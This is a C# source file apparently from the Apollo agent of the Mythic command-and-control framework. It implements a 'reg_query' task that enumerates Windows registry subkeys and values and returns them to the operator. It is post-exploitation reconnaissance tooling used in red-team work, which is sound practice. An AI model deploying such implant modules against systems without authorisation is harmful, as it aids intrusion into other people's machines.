#define COMMAND_NAME_UPPER

#if DEBUG
#define REG_QUERY
#endif

#if REG_QUERY

using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.Serialization;
using System.Text;
using ST = System.Threading.Tasks;

namespace Tasks
{
    public class reg_query : Tasking
    {
        [DataContract]
        internal struct RegQueryParameters
        {
            [DataMember(Name = "hive")]
            public string Hive;
            [DataMember(Name = "key")]
            public string Key;
        }
        [DataContract]
        internal struct RegQueryResult
        {
            [DataMember(Name = "hive")]
            public string Hive;
            [DataMember(Name = "name")]
            public string Name;
            [DataMember(Name = "full_name")]
            public string FullName;
            [DataMember(Name = "value")]
            public string Value;
            [DataMember(Name = "value_type")]
            public string Type;
            [DataMember(Name = "result_type")]
            public string ResultType;
        }
        public reg_query(IAgent agent, ApolloInterop.Structs.MythicStructs.Task data) : base(agent, data)
        {
        }

        public override void Kill()
        {
            base.Kill();
        }

        private static string[] GetValueNames(string hive, string subkey)
        {
            string[] results = new string[0];
            RegistryKey regKey;
            switch (hive)
            {
                case "HKU":
                    regKey = Registry.Users.OpenSubKey(subkey);
                    break;
                case "HKCC":
                    regKey = Registry.CurrentConfig.OpenSubKey(subkey);
                    break;
                case "HKCU":
                    regKey = Registry.CurrentUser.OpenSubKey(subkey);
                    break;
                case "HKLM":
                    regKey = Registry.LocalMachine.OpenSubKey(subkey);
                    break;
                case "HKCR":
                    regKey = Registry.ClassesRoot.OpenSubKey(subkey);
                    break;
                default:
                    throw new Exception($"Unknown registry hive: {hive}");
            }
            if (regKey != null)
            {
                results = regKey.GetValueNames();
            }
            regKey.Close();
            return results;
        }

        private static object GetValue(string hive, string subkey, string key)
        {
            RegistryKey regKey;
            object val;
            switch (hive)
            {
                case "HKU":
                    regKey = Registry.Users.OpenSubKey(subkey);
                    break;
                case "HKCC":
                    regKey = Registry.CurrentConfig.OpenSubKey(subkey);
                    break;
                case "HKCU":
                    regKey = Registry.CurrentUser.OpenSubKey(subkey);
                    break;
                case "HKLM":
                    regKey = Registry.LocalMachine.OpenSubKey(subkey);
                    break;
                case "HKCR":
                    regKey = Registry.ClassesRoot.OpenSubKey(subkey);
                    break;
                default:
                    throw new Exception($"Unknown registry hive: {hive}");
            }
            val = regKey.GetValue(key);
            regKey.Close();
            return val;
        }

        private static string[] GetSubKeys(string hive, string subkey)
        {
            // subkey is gonna be in format of HKLM:\, HKCU:\, HKCR:\
            RegistryKey regKey;
            string[] results = new string[0];
            switch (hive)
            {
                case "HKU":
                    regKey = Registry.Users.OpenSubKey(subkey);
                    break;
                case "HKCC":
                    regKey = Registry.CurrentConfig.OpenSubKey(subkey);
                    break;
                case "HKCU":
                    regKey = Registry.CurrentUser.OpenSubKey(subkey);
                    break;
                case "HKLM":
                    regKey = Registry.LocalMachine.OpenSubKey(subkey);
                    break;
                case "HKCR":
                    regKey = Registry.ClassesRoot.OpenSubKey(subkey);
                    break;
                default:
                    throw new Exception($"Unknown registry hive: {hive}");
            }
            results = regKey.GetSubKeyNames();
            regKey.Close();
            return results;
        }

        private void SetValueType(object tmpVal, ref RegQueryResult res)
        {
            if (tmpVal is String)
            {
                res.Value = string.IsNullOrEmpty(tmpVal.ToString()) ? "(value not set)" : tmpVal.ToString();
                res.Type = "string";
            }
            else if (tmpVal is int)
            {
                res.Value = tmpVal.ToString();
                res.Type = "int";
            }
            else if (tmpVal is byte[])
            {
                res.Value = BitConverter.ToString((byte[])tmpVal);
                res.Type = "byte[]";
            }
            else if (tmpVal is null)
            {
                res.Value = "(value not set)";
                res.Type = "null";
            }
            else
            {
                res.Value = tmpVal.ToString();
                res.Type = "unknown";
            }
        }

        public override ST.Task CreateTasking()
        {
            return new ST.Task(() =>
            {
                TaskResponse resp;
                RegQueryParameters parameters = _jsonSerializer.Deserialize<RegQueryParameters>(_data.Parameters);
                List<RegQueryResult> results = new List<RegQueryResult>();
                string error = "";
                try
                {
                    string[] subkeys = GetSubKeys(parameters.Hive, parameters.Key);
                    foreach(string subkey in subkeys)
                    {
                        results.Add(new RegQueryResult
                        {
                            Name = subkey,
                            FullName = parameters.Key.EndsWith("\\") ? $"{parameters.Key}{subkey}" : $"{parameters.Key}\\{subkey}",
                            Hive = parameters.Hive,
                            ResultType = "key"
                        });
                    }
                } catch (Exception ex){ error = ex.Message; }
                try
                {
                    object tmpVal;
                    string[] subValNames = GetValueNames(parameters.Hive, parameters.Key);
                    foreach(string valName in subValNames)
                    {
                        RegQueryResult res = new RegQueryResult
                        {
                            Name = valName,
                            FullName = parameters.Key,
                            Hive = parameters.Hive,
                            ResultType = "value"
                        };
                        try
                        {
                            tmpVal = GetValue(parameters.Hive, parameters.Key, valName);
                        } catch (Exception ex)
                        {
                            tmpVal = ex.Message;
                        }
                        SetValueType(tmpVal, ref res);
                        results.Add(res);
                    }
                    
                    //try
                    //{
                    //    tmpVal = GetValue(parameters.Hive, parameters.Key, "");
                    //} catch (Exception ex)
                    //{
                    //    tmpVal = ex.Message;
                    //}
                    //RegQueryResult defaultVal = new RegQueryResult
                    //{
                    //    Name = "(Default)",
                    //    FullName = parameters.Key,
                    //    Hive = parameters.Hive,
                    //    ResultType = "value"
                    //};
                    //SetValueType(tmpVal, ref defaultVal);
                    //results.Add(defaultVal);
                } catch (Exception ex)
                {
                    error += $"\n{ex.Message}";
                }

                if (results.Count == 0)
                {
                    resp = CreateTaskResponse(error, true, "error");
                } else
                {
                    resp = CreateTaskResponse(
                        _jsonSerializer.Serialize(results.ToArray()), true);
                }

                // Your code here..
                // Then add response to queue
                _agent.GetTaskManager().AddTaskResponseToQueue(resp);
            }, _cancellationToken.Token);
        }
    }
}

#endif